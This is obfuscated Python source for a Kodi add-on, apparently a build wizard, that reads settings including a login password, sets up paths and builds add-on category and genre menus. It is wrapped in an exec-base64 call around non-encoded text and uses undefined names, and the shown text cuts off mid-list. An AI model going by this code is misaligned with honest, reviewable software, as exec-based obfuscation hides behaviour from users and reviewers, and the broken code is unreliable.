import base64;exec base64.b64decode('import urllib , urllib2 , re , xbmcplugin , xbmcgui , xbmc , xbmcaddon
import os , sys , time , xbmcvfs , glob , shutil , datetime , zipfile , ntpath
import subprocess , threading
import yt , downloader , checkPath , SF , clean , TXT , kll
import binascii
import hashlib
import speedtest
import extract
if 64 - 64: i11iIiiIii
try :
 from sqlite3 import dbapi2 as database
 if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
except :
 from pysqlite2 import dbapi2 as database
 if 73 - 73: II111iiii
from addon . common . addon import Addon
from addon . common . net import Net
if 22 - 22: I1IiiI * Oo0Ooo / OoO0O00 . OoOoOO00 . o0oOOo0O0Ooo / I1ii11iIi11i
######################################################
I1IiI = 'plugin.program.tbs'
o0OOO = 'TotalRevolution'
if 13 - 13: ooOo + Oo
o0O = xbmcaddon . Addon ( id = I1IiI )
zip = o0O . getSetting ( 'zip' )
IiiIII111iI = o0O . getSetting ( 'localcopy' )
IiII = o0O . getSetting ( 'private' )
iI1Ii11111iIi = o0O . getSetting ( 'reseller' )
i1i1II = o0O . getSetting ( 'openelec' )
O0oo0OO0 = o0O . getSetting ( 'resellername' )
I1i1iiI1 = o0O . getSetting ( 'resellerid' )
iiIIIII1i1iI = o0O . getSetting ( 'favourites' )
o0oO0 = o0O . getSetting ( 'sources' )
oo00 = o0O . getSetting ( 'repositories' )
o00 = o0O . getSetting ( 'enablekeyword' )
Oo0oO0ooo = o0O . getSetting ( 'keywordpath' )
o0oOoO00o = o0O . getSetting ( 'keywordname' )
i1 = o0O . getSetting ( 'mastercopy' )
oOOoo00O0O = o0O . getSetting ( 'username' ) . replace ( ' ' , '%20' )
i1111 = o0O . getSetting ( 'password' )
i11 = o0O . getSetting ( 'versionoverride' )
I11 = o0O . getSetting ( 'debug' )
Oo0o0000o0o0 = o0O . getSetting ( 'login' )
oOo0oooo00o = o0O . getSetting ( 'addonportal' )
oO0o0o0ooO0oO = o0O . getSetting ( 'maintenance' )
oo0o0O00 = o0O . getSetting ( 'hardwareportal' )
oO = o0O . getSetting ( 'maintenance' )
i1iiIIiiI111 = o0O . getSetting ( 'latestnews' )
oooOOOOO = o0O . getSetting ( 'tutorialportal' )
i1iiIII111ii = o0O . getSetting ( 'startupvideo' )
i1iIIi1 = o0O . getSetting ( 'startupvideopath' )
ii11iIi1I = o0O . getSetting ( 'wizard' )
iI111I11I1I1 = o0O . getSetting ( 'wizardurl1' )
OOooO0OOoo = o0O . getSetting ( 'wizardname1' )
iIii1 = o0O . getSetting ( 'wizardurl2' )
oOOoO0 = o0O . getSetting ( 'wizardname2' )
O0OoO000O0OO = o0O . getSetting ( 'wizardurl3' )
iiI1IiI = o0O . getSetting ( 'wizardname3' )
II = o0O . getSetting ( 'wizardurl4' )
ooOoOoo0O = o0O . getSetting ( 'wizardname4' )
OooO0 = o0O . getSetting ( 'wizardurl5' )
II11iiii1Ii = o0O . getSetting ( 'wizardname5' )
OO0o = xbmcgui . Dialog ( )
Ooo = xbmcgui . DialogProgress ( )
O0o0Oo = xbmc . translatePath ( 'special://home/' )
Oo00OOOOO = xbmc . translatePath ( 'special://profile/' )
O0O = os . path . join ( Oo00OOOOO , 'addon_data' )
O00o0OO = xbmc . translatePath ( os . path . join ( Oo00OOOOO , 'playlists' ) )
I11i1 = xbmc . translatePath ( os . path . join ( Oo00OOOOO , 'media' ) )
iIi1ii1I1 = xbmc . translatePath ( os . path . join ( Oo00OOOOO , 'Database' ) )
o0 = os . path . join ( O0o0Oo , 'CP_Profiles' )
I11II1i = os . path . join ( o0 , 'Master' )
IIIII = os . path . join ( Oo00OOOOO , 'Thumbnails' )
ooooooO0oo = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
IIiiiiiiIi1I1 = xbmc . translatePath ( os . path . join ( 'special://xbmc' , 'addons' ) )
I1IIIii = os . path . join ( ooooooO0oo , I1IiI , 'default.py' )
oOoOooOo0o0 = os . path . join ( ooooooO0oo , I1IiI , 'fanart.jpg' )
OOOO = os . path . join ( ooooooO0oo , I1IiI , 'resources' , 'addonxml' )
OOO00 = os . path . join ( ooooooO0oo , I1IiI , 'service.py' )
iiiiiIIii = os . path . join ( ooooooO0oo , I1IiI , 'resources' , 'backup' )
O000OO0 = os . path . join ( Oo00OOOOO , 'guisettings.xml' )
I11iii1Ii = os . path . join ( Oo00OOOOO , 'guifix.xml' )
I1IIiiIiii = ''
O000oo0O = os . path . join ( ooooooO0oo , I1IiI , 'icon_menu.png' )
OOOOi11i1 = os . path . join ( Oo00OOOOO , 'favourites.xml' )
IIIii1II1II = os . path . join ( Oo00OOOOO , 'sources.xml' )
i1I1iI = os . path . join ( Oo00OOOOO , 'advancedsettings.xml' )
oo0OooOOo0 = os . path . join ( Oo00OOOOO , 'profiles.xml' )
o0OO00oO = os . path . join ( Oo00OOOOO , 'RssFeeds.xml' )
I11i1I1I = os . path . join ( Oo00OOOOO , 'keymaps' , 'keyboard.xml' )
oO0Oo = xbmc . translatePath ( os . path . join ( zip ) )
oOOoo0Oo = os . path . join ( oO0Oo , 'Community_Builds' , '' )
o00OO00OoO = os . path . join ( O0O , I1IiI , 'startup.xml' )
OOOO0OOoO0O0 = os . path . join ( O0O , I1IiI , 'temp.xml' )
O0Oo000ooO00 = os . path . join ( O0O , I1IiI , 'id.xml' )
oO0 = os . path . join ( O0O , I1IiI , 'progress' )
Ii1iIiII1ii1 = os . path . join ( O0O , I1IiI , 'progresstemp' )
ooOooo000oOO = os . path . join ( ooooooO0oo , I1IiI , 'resources' , 'tmr' )
Oo0oOOo = os . path . join ( O0O , I1IiI , 'idtemp.xml' )
Oo0OoO00oOO0o = os . path . join ( O0O , I1IiI , 'temp' )
OOO00O = os . path . join ( O0O , I1IiI , 'ascii_results' )
OOoOO0oo0ooO = os . path . join ( O0O , I1IiI , 'ascii_results1' )
O0o0O00Oo0o0 = os . path . join ( O0O , I1IiI , 'ascii_results2' )
O00O0oOO00O00 = os . path . join ( O0O , I1IiI , 'guizip' )
i1Oo00 = os . path . join ( O0O , I1IiI , 'successtxt.txt' )
i1i = os . path . join ( ooooooO0oo , I1IiI , 'resources/' )
iiI111I1iIiI = os . path . join ( ooooooO0oo , I1IiI , 'default.py' )
IIIi1I1IIii1II = os . path . join ( O0O , I1IiI , 'testmode' )
O0ii1ii1ii = xbmc . getSkinDir ( )
oooooOoo0ooo = xbmc . translatePath ( 'special://logpath/' )
I1I1IiI1 = '/storage/backup'
III1iII1I1ii = '/storage/.restore/'
oOOo0 = '/storage/.config/'
oo00O00oO = '/storage/'
iIiIIIi = Net ( )
ooo00OOOooO = os . path . join ( O0O , I1IiI )
O00OOOoOoo0O = os . path . join ( ooo00OOOooO , 'guinew.xml' )
O000OOo00oo = os . path . join ( ooo00OOOooO , 'guitemp' )
oo0OOo = os . path . join ( O0O , I1IiI , 'scripts' )
ooOOO00Ooo = os . path . join ( oO0Oo , 'Database' )
IiIIIi1iIi = os . path . join ( ooooooO0oo , 'packages' )
ooOOoooooo = os . path . join ( Oo00OOOOO , 'addontemp' )
II1I = os . path . join ( Oo00OOOOO , '.cbcfg' )
O0i1II1Iiii1I11 = 'Venztech'
Oo0oO0ooo = 'http://urlshortbot.com/venztech'
IIII = [ 'firstrun' , 'plugin.program.tbs' , 'plugin.program.totalinstaller' , 'script.module.addon.common' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' , 'favourites.xml' ]
iiIiI = [ 'firstrun' , 'plugin.program.tbs' , 'plugin.program.totalinstaller' , 'script.module.addon.common' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' , 'favourites.xml' , 'guisettings.xml' , 'CP_Profiles' , 'temp' ]
o00oooO0Oo = 0.0
o0O0OOO0Ooo = 0.0
iiIiII1 = '0'
OOO00O0O = [ '/storage/.kodi' , '/storage/.cache' , '/storage/.config' , '/storage/.ssh' ]
iii = '1889903'
oOooOOOoOo = xbmc . getInfoLabel ( "System.BuildVersion" )
if 41 - 41: OooO00OOoO00 - OO000 + OOOOOOoo0O
def i1I1iI1iIi111i ( ) :
 Ooo . create ( 'Checking dependencies' , '' , 'Please Wait...' )
 iiIi1IIi1I = [ ]
 if 84 - 84: oOO00 * i1Ii11i1i % o0oOOoo
 for oOo00O0oo00o0 in os . listdir ( ooooooO0oo ) :
  if oOo00O0oo00o0 != 'packages' :
   try :
    ii = os . path . join ( ooooooO0oo , oOo00O0oo00o0 , 'addon.xml' )
    OOooooO0Oo = open ( ii , mode = 'r' )
    OO = OOooooO0Oo . read ( )
    OOooooO0Oo . close ( )
    iIiIIi1 = re . compile ( 'import addon="(.+?)"' ) . findall ( OO )
    if 7 - 7: o0oOOoo - Oo0Ooo - ooOo + o0oOOoo
    for iI1I11iiI1i in iIiIIi1 :
     if 78 - 78: ooOo % O0 % OO000
     if not 'xbmc.python' in iI1I11iiI1i and not iI1I11iiI1i in iiIi1IIi1I :
      iiIi1IIi1I . append ( iI1I11iiI1i )
      if debug == 'true' :
       print 'Script Requires --- ' + iI1I11iiI1i
   except :
    pass
    if 46 - 46: OoooooooOO . i11iIiiIii
 return iiIi1IIi1I
 if 94 - 94: o0oOOo0O0Ooo * OO000 / Oo0Ooo / OO000
 if 87 - 87: Oo0Ooo . oOO00
class O0OO0O ( xbmcgui . WindowXMLDialog ) :
 if 81 - 81: ooOo . o0oOOo0O0Ooo % O0 / I1IiiI - ooOo
 def __init__ ( self , * args , ** kwargs ) :
  self . shut = kwargs [ 'close_time' ]
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" )
  xbmc . executebuiltin ( "Skin.SetBool(AnimeWindowXMLDialogClose)" )
  if 43 - 43: i11iIiiIii + Oo0Ooo * II111iiii * i1Ii11i1i * O0
 def onFocus ( self , controlID ) :
  pass
  if 64 - 64: Oo % iIii1I11I1II1 * ooOo
 def onClick ( self , controlID ) :
  if controlID == 12 :
   xbmc . Player ( ) . stop ( )
   self . _close_dialog ( )
   if 79 - 79: O0
 def onAction ( self , action ) :
  if action in [ 5 , 6 , 7 , 9 , 10 , 92 , 117 ] or action . getButtonCode ( ) in [ 275 , 257 , 261 ] :
   xbmc . Player ( ) . stop ( )
   self . _close_dialog ( )
   if 78 - 78: I1ii11iIi11i + Oo - i1Ii11i1i
 def _close_dialog ( self ) :
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" )
  time . sleep ( .4 )
  self . close ( )
  if 38 - 38: o0oOOo0O0Ooo - ooOo + iIii1I11I1II1 / OoOoOO00 % Oo0Ooo
  if 57 - 57: OoO0O00 / o0oOOoo
def Ii1I1Ii ( name , url , mode , iconimage , fanart , video , description , skins , guisettingslink , artpack ) :
 OOoO0 = sys . argv [ 0 ]
 OOoO0 += "?url=" + urllib . quote_plus ( url )
 OOoO0 += "&mode=" + str ( mode )
 OOoO0 += "&name=" + urllib . quote_plus ( name )
 OOoO0 += "&iconimage=" + urllib . quote_plus ( iconimage )
 OOoO0 += "&fanart=" + urllib . quote_plus ( fanart )
 OOoO0 += "&video=" + urllib . quote_plus ( video )
 OOoO0 += "&description=" + urllib . quote_plus ( description )
 OOoO0 += "&skins=" + urllib . quote_plus ( skins )
 OOoO0 += "&guisettingslink=" + urllib . quote_plus ( guisettingslink )
 OOoO0 += "&artpack=" + urllib . quote_plus ( artpack )
 if 86 - 86: ooOo * o0oOOo0O0Ooo % i1IIi . OO000 . i11iIiiIii
 oOOoo00O00o = True
 O0O00Oo = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 97 - 97: O0 * OoooooooOO . OoooooooOO
 O0O00Oo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 O0O00Oo . setProperty ( "Fanart_Image" , fanart )
 O0O00Oo . setProperty ( "Build.Video" , video )
 if 33 - 33: i1Ii11i1i + OOOOOOoo0O * ooOo / iIii1I11I1II1 - I1IiiI
 if ( mode == None ) or ( mode == 'restore_option' ) or ( mode == 'backup_option' ) or ( mode == 'cb_root_menu' ) or ( mode == 'genres' ) or ( mode == 'grab_builds' ) or ( mode == 'community_menu' ) or ( mode == 'instructions' ) or ( mode == 'countries' ) or ( mode == 'update_build' ) or ( url == None ) or ( len ( url ) < 1 ) :
  if 54 - 54: i1Ii11i1i / Oo . ooOo % OOOOOOoo0O
  oOOoo00O00o = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = OOoO0 , listitem = O0O00Oo , isFolder = True )
  if 57 - 57: i11iIiiIii . I1ii11iIi11i - OO000 - ooOo + OoOoOO00
 else :
  oOOoo00O00o = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = OOoO0 , listitem = O0O00Oo , isFolder = False )
  if 63 - 63: OoOoOO00 * OOOOOOoo0O
 return oOOoo00O00o
 if 69 - 69: O0 . OoO0O00
 if 49 - 49: I1IiiI - OooO00OOoO00
def OoOOoOooooOOo ( handle , url , listitem , isFolder ) :
 xbmcplugin . addDirectoryItem ( handle , url , listitem , isFolder )
 if 87 - 87: I1IiiI
 if 58 - 58: OoOoOO00 % o0oOOo0O0Ooo
def i1OOoO ( name , url , mode , iconimage , fanart , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 if 89 - 89: o0oOOo0O0Ooo + OoO0O00 * OooO00OOoO00 * OO000
 iconimage = O000oo0O
 if 37 - 37: OoooooooOO - O0 - o0oOOo0O0Ooo
 OOoO0 = sys . argv [ 0 ]
 OOoO0 += "?url=" + urllib . quote_plus ( url )
 OOoO0 += "&mode=" + str ( mode )
 OOoO0 += "&name=" + urllib . quote_plus ( name )
 OOoO0 += "&iconimage=" + urllib . quote_plus ( iconimage )
 OOoO0 += "&fanart=" + urllib . quote_plus ( fanart )
 OOoO0 += "&author=" + urllib . quote_plus ( author )
 OOoO0 += "&description=" + urllib . quote_plus ( description )
 OOoO0 += "&version=" + urllib . quote_plus ( version )
 OOoO0 += "&buildname=" + urllib . quote_plus ( buildname )
 OOoO0 += "&updated=" + urllib . quote_plus ( updated )
 OOoO0 += "&skins=" + urllib . quote_plus ( skins )
 OOoO0 += "&videoaddons=" + urllib . quote_plus ( videoaddons )
 OOoO0 += "&audioaddons=" + urllib . quote_plus ( audioaddons )
 OOoO0 += "&buildname=" + urllib . quote_plus ( buildname )
 OOoO0 += "&programaddons=" + urllib . quote_plus ( programaddons )
 OOoO0 += "&pictureaddons=" + urllib . quote_plus ( pictureaddons )
 OOoO0 += "&sources=" + urllib . quote_plus ( sources )
 OOoO0 += "&adult=" + urllib . quote_plus ( adult )
 if 77 - 77: Oo * iIii1I11I1II1
 oOOoo00O00o = True
 O0O00Oo = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 98 - 98: I1IiiI % OO000 * OoooooooOO
 O0O00Oo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 O0O00Oo . setProperty ( "Fanart_Image" , fanart )
 O0O00Oo . setProperty ( "Build.Video" , OoiIIiIi1 )
 if 74 - 74: OOOOOOoo0O + o0oOOo0O0Ooo
 oOOoo00O00o = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = OOoO0 , listitem = O0O00Oo , isFolder = False )
 if 71 - 71: Oo0Ooo % Oo
 return oOOoo00O00o
 if 98 - 98: OooO00OOoO00 % i11iIiiIii % o0oOOoo + OO000
def OOoOO0o0o0 ( title , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' , zip_link = '' , repo_link = '' , repo_id = '' , addon_id = '' , provider_name = '' , forum = '' , data_path = '' ) :
 if len ( iconimage ) > 0 :
  if 11 - 11: I1IiiI
  iconimage = O000oo0O
  if 16 - 16: OO000 + oOO00 * O0 % i1IIi . I1IiiI
 else :
  iconimage = 'DefaultFolder.png'
  if 67 - 67: OoooooooOO / I1IiiI * OO000 + OooO00OOoO00
 if fanart == '' :
  fanart = oOoOooOo0o0
  if 65 - 65: OoooooooOO - I1ii11iIi11i / o0oOOoo / II111iiii / i1IIi
 OOoO0 = sys . argv [ 0 ]
 OOoO0 += "?url=" + urllib . quote_plus ( url )
 OOoO0 += "&zip_link=" + urllib . quote_plus ( zip_link )
 OOoO0 += "&repo_link=" + urllib . quote_plus ( repo_link )
 OOoO0 += "&data_path=" + urllib . quote_plus ( data_path )
 OOoO0 += "&provider_name=" + str ( provider_name )
 OOoO0 += "&forum=" + str ( forum )
 OOoO0 += "&repo_id=" + str ( repo_id )
 OOoO0 += "&addon_id=" + str ( addon_id )
 OOoO0 += "&mode=" + str ( mode )
 OOoO0 += "&name=" + urllib . quote_plus ( name )
 OOoO0 += "&fanart=" + urllib . quote_plus ( fanart )
 OOoO0 += "&video=" + urllib . quote_plus ( video )
 OOoO0 += "&description=" + urllib . quote_plus ( description )
 if 71 - 71: i1Ii11i1i + OO000
 oOOoo00O00o = True
 O0O00Oo = xbmcgui . ListItem ( title , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 28 - 28: Oo
 O0O00Oo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 O0O00Oo . setProperty ( "Fanart_Image" , fanart )
 O0O00Oo . setProperty ( "Build.Video" , video )
 if 38 - 38: o0oOOoo % II111iiii % OooO00OOoO00 / OoO0O00 + OoOoOO00 / i1IIi
 OoOOoOooooOOo ( handle = int ( sys . argv [ 1 ] ) , url = OOoO0 , listitem = O0O00Oo , isFolder = False )
 if 54 - 54: iIii1I11I1II1 % I1ii11iIi11i - Oo / ooOo - OoO0O00 . OooO00OOoO00
 if 11 - 11: I1ii11iIi11i . OoO0O00 * oOO00 * OoooooooOO + o0oOOoo
def IiII111i1i11 ( type , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' ) :
 if not 'addon' in type :
  if 40 - 40: o0oOOoo * oOO00 * i11iIiiIii
  if len ( iconimage ) > 0 :
   iconimage = I1IIiiIiii + iconimage
   if 57 - 57: o0oOOoo
  else :
   iconimage = O000oo0O
   if 29 - 29: OoOoOO00 - oOO00 * OoooooooOO + OoooooooOO . II111iiii + OoooooooOO
 if 'addon' in type :
  if 74 - 74: OO000 - oOO00 / OOOOOOoo0O * O0 - Oo
  if len ( iconimage ) > 0 :
   iconimage = iconimage
  else :
   iconimage = 'DefaultFolder.png'
   if 19 - 19: I1IiiI
 if fanart == '' :
  fanart = oOoOooOo0o0
  if 25 - 25: OO000 / o0oOOoo
 OOoO0 = sys . argv [ 0 ]
 OOoO0 += "?url=" + urllib . quote_plus ( url )
 OOoO0 += "&mode=" + str ( mode )
 OOoO0 += "&name=" + urllib . quote_plus ( name )
 OOoO0 += "&iconimage=" + urllib . quote_plus ( iconimage )
 OOoO0 += "&fanart=" + urllib . quote_plus ( fanart )
 OOoO0 += "&video=" + urllib . quote_plus ( video )
 OOoO0 += "&description=" + urllib . quote_plus ( description )
 if 31 - 31: Oo . O0 % I1IiiI . o0oOOo0O0Ooo + oOO00
 oOOoo00O00o = True
 O0O00Oo = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 71 - 71: i1Ii11i1i . II111iiii
 O0O00Oo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 O0O00Oo . setProperty ( "Fanart_Image" , fanart )
 O0O00Oo . setProperty ( "Build.Video" , video )
 if 62 - 62: OoooooooOO . OooO00OOoO00
 if 'folder' in type :
  oOOoo00O00o = OoOOoOooooOOo ( handle = int ( sys . argv [ 1 ] ) , url = OOoO0 , listitem = O0O00Oo , isFolder = True )
  if 61 - 61: OoOoOO00 - Oo - i1IIi
 else :
  oOOoo00O00o = OoOOoOooooOOo ( handle = int ( sys . argv [ 1 ] ) , url = OOoO0 , listitem = O0O00Oo , isFolder = False )
  if 25 - 25: O0 * OooO00OOoO00 + I1ii11iIi11i . o0oOOo0O0Ooo . o0oOOo0O0Ooo
 return oOOoo00O00o
 if 58 - 58: I1IiiI
 if 53 - 53: i1IIi
def o0OOOoO0 ( url ) :
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][PLUGIN][/COLOR] Audio' , url + '&typex=audio' , 'grab_addons' , 'audio.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][PLUGIN][/COLOR] Image (Picture)' , url + '&typex=image' , 'grab_addons' , 'pictures.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][PLUGIN][/COLOR] Program' , url + '&typex=program' , 'grab_addons' , 'programs.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][PLUGIN][/COLOR] Video' , url + '&typex=video' , 'grab_addons' , 'video.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Movies (Used for library scanning)' , url + '&typex=movie%20scraper' , 'grab_addons' , 'movies.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] TV Shows (Used for library scanning)' , url + '&typex=tv%20show%20scraper' , 'grab_addons' , 'tvshows.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Artists (Used for library scanning)' , url + '&typex=artist%20scraper' , 'grab_addons' , 'artists.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Videos (Used for library scanning)' , url + '&typex=music%20video%20scraper' , 'grab_addons' , 'musicvideos.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] All Services' , url + '&typex=service' , 'grab_addons' , 'services.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] Weather Service' , url + '&typex=weather' , 'grab_addons' , 'weather.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Repositories' , url + '&typex=repository' , 'grab_addons' , 'repositories.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Scripts (Program Add-ons)' , url + '&typex=executable' , 'grab_addons' , 'scripts.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Screensavers' , url + '&typex=screensaver' , 'grab_addons' , 'screensaver.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Script Modules' , url + '&typex=script%20module' , 'grab_addons' , 'scriptmodules.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Skins' , url + '&typex=skin' , 'grab_addons' , 'skins.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Subtitles' , url + '&typex=subtitles' , 'grab_addons' , 'subtitles.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Web Interface' , url + '&typex=web%20interface' , 'grab_addons' , 'webinterface.png' , '' , '' , '' )
 if 73 - 73: OooO00OOoO00 % i11iIiiIii - I1IiiI
 if 7 - 7: O0 * i11iIiiIii * OO000 + o0oOOoo % OoO0O00 - o0oOOoo
def II1IIIIiII1i ( ) :
 i1II1 ( )
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://outdated/",return)' )
 if 25 - 25: i1Ii11i1i / iIii1I11I1II1 % OOOOOOoo0O
 if 42 - 42: i11iIiiIii * iIii1I11I1II1 / I1ii11iIi11i . i11iIiiIii % OooO00OOoO00
def i1iI ( url ) :
 IiII111i1i11 ( 'folder' , 'African' , url + '&genre=african' , 'grab_addons' , 'african.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Arabic' , url + '&genre=arabic' , 'grab_addons' , 'arabic.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Asian' , url + '&genre=asian' , 'grab_addons' , 'asian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Australian' , url + '&genre=australian' , 'grab_addons' , 'australian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Austrian' , url + '&genre=austrian' , 'grab_addons' , 'austrian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Belgian' , url + '&genre=belgian' , 'grab_addons' , 'belgian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Brazilian' , url + '&genre=brazilian' , 'grab_addons' , 'brazilian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Canadian' , url + '&genre=canadian' , 'grab_addons' , 'canadian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Chinese' , url + '&genre=chinese' , 'grab_addons' , 'chinese.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Colombian' , url + '&genre=columbian' , 'grab_addons' , 'columbian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Croatian' , url + '&genre=croatian' , 'grab_addons' , 'croatian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Czech' , url + '&genre=czech' , 'grab_addons' , 'czech.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Danish' , url + '&genre=danish' , 'grab_addons' , 'danish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Dominican' , url + '&genre=dominican' , 'grab_addons' , 'dominican.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Dutch' , url + '&genre=dutch' , 'grab_addons' , 'dutch.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Egyptian' , url + '&genre=egyptian' , 'grab_addons' , 'egyptian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Filipino' , url + '&genre=filipino' , 'grab_addons' , 'filipino.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Finnish' , url + '&genre=finnish' , 'grab_addons' , 'finnish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'French' , url + '&genre=french' , 'grab_addons' , 'french.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'German' , url + '&genre=german' , 'grab_addons' , 'german.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Greek' , url + '&genre=greek' , 'grab_addons' , 'greek.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Hebrew' , url + '&genre=hebrew' , 'grab_addons' , 'hebrew.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Hungarian' , url + '&genre=hungarian' , 'grab_addons' , 'hungarian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Icelandic' , url + '&genre=icelandic' , 'grab_addons' , 'icelandic.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Indian' , url + '&genre=indian' , 'grab_addons' , 'indian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Irish' , url + '&genre=irish' , 'grab_addons' , 'irish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Italian' , url + '&genre=italian' , 'grab_addons' , 'italian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Japanese' , url + '&genre=japanese' , 'grab_addons' , 'japanese.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Korean' , url + '&genre=korean' , 'grab_addons' , 'korean.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Lebanese' , url + '&genre=lebanese' , 'grab_addons' , 'lebanese.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Mongolian' , url + '&genre=mongolian' , 'grab_addons' , 'mongolian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Moroccan' , url + '&genre=moroccan' , 'grab_addons' , 'moroccan.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Nepali' , url + '&genre=nepali' , 'grab_addons' , 'nepali.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'New Zealand' , url + '&genre=newzealand' , 'grab_addons' , 'newzealand.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Norwegian' , url + '&genre=norwegian' , 'grab_addons' , 'norwegian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Pakistani' , url + '&genre=pakistani' , 'grab_addons' , 'pakistani.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Polish' , url + '&genre=polish' , 'grab_addons' , 'polish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Portuguese' , url + '&genre=portuguese' , 'grab_addons' , 'portuguese.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Romanian' , url + '&genre=romanian' , 'grab_addons' , 'romanian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Russian' , url + '&genre=russian' , 'grab_addons' , 'russian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Singapore' , url + '&genre=singapore' , 'grab_addons' , 'singapore.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Spanish' , url + '&genre=spanish' , 'grab_addons' , 'spanish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Swedish' , url + '&genre=swedish' , 'grab_addons' , 'swedish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Swiss' , url + '&genre=swiss' , 'grab_addons' , 'swiss.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Syrian' , url + '&genre=syrian' , 'grab_addons' , 'syrian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Tamil' , url + '&genre=tamil' , 'grab_addons' , 'tamil.png' , '' , '' , '' )
